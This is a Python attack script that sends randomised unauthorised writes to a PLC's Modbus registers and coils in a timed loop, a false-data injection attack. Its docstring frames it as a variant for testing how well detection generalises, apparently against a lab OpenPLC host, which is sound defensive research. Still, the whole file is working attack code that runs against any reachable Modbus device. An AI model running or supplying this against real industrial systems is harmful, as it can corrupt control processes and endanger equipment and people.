#!/usr/bin/env python3
"""
False-data injection / unauthorised write -- VARIANT (for generalisation testing).

Different code from modbus_write.py: instead of a few fixed writes, this sweeps
RANDOMISED values across several registers and coils in a loop (single, multiple,
and coil writes). Same attack (unauthorised writes to the PLC), different pattern.

Usage:  python3 write2.py [host] [port] [rounds]
        defaults: openplc 502 60
"""
import sys, time, random
from pymodbus.client import ModbusTcpClient

HOST = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502
ROUNDS = int(sys.argv[3]) if len(sys.argv) > 3 else 60

c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    print(f"[!] could not connect to {HOST}:{PORT}")
    sys.exit(1)

print(f"[*] VARIANT injection on {HOST}:{PORT}, {ROUNDS} rounds of sweeping writes...")
n = 0
for i in range(ROUNDS):
    c.write_register(random.randint(0, 20), random.randint(0, 65535)); n += 1
    c.write_coil(random.randint(0, 20), bool(random.getrandbits(1))); n += 1
    if i % 5 == 0:
        c.write_registers(0, [random.randint(0, 65535) for _ in range(4)]); n += 1
    time.sleep(0.1)
c.close()

print(f"[*] Sent {n} write operations across registers and coils.")
print("[*] Done -- variant injection complete.")
